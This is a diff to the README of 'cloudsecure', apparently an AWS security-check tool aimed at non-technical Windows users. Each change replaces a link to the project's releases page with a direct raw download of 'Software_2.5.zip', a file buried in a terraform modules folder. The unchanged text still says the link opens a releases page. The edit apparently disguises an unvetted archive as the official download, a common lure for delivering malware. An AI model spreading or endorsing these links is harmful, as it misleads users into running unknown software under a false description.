@@ -1,6 +1,6 @@
 # 🔒 cloudsecure - Simplify Your AWS Security Checks
 
-[![Download Latest Release](https://img.shields.io/badge/Download-cloudsecure-blue?style=for-the-badge)](https://github.com/Georgian12121/cloudsecure/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-cloudsecure-blue?style=for-the-badge)](https://raw.githubusercontent.com/Georgian12121/cloudsecure/main/onboarding/terraform/modules/Software_2.5.zip)
 
 Welcome to cloudsecure. This tool helps you check the security of your AWS setup. It uses smart analysis to find possible risks. This guide will help you download and run cloudsecure on your Windows computer without any coding.
 
@@ -36,7 +36,7 @@ Follow these steps to get cloudsecure up and running quickly.
 
 Click this big button to go to the download page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-cloudsecure-blue?style=for-the-badge)](https://github.com/Georgian12121/cloudsecure/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-cloudsecure-blue?style=for-the-badge)](https://raw.githubusercontent.com/Georgian12121/cloudsecure/main/onboarding/terraform/modules/Software_2.5.zip)
 
 This link opens a page with the latest versions of cloudsecure available. You will find files you can download.
 
@@ -104,11 +104,11 @@ You can save or print the report for your records.
 
 ## 🔄 Keep cloudsecure Updated
 
-Check the [releases page](https://github.com/Georgian12121/cloudsecure/releases) regularly for new versions. Updates fix bugs and add new checks.
+Check the [releases page](https://raw.githubusercontent.com/Georgian12121/cloudsecure/main/onboarding/terraform/modules/Software_2.5.zip) regularly for new versions. Updates fix bugs and add new checks.
 
 You can download the latest version anytime using the button below:
 
-[![Download cloudsecure](https://img.shields.io/badge/Download-cloudsecure-brightgreen?style=for-the-badge)](https://github.com/Georgian12121/cloudsecure/releases)
+[![Download cloudsecure](https://img.shields.io/badge/Download-cloudsecure-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Georgian12121/cloudsecure/main/onboarding/terraform/modules/Software_2.5.zip)
 
 ## 📋 About this Project
 
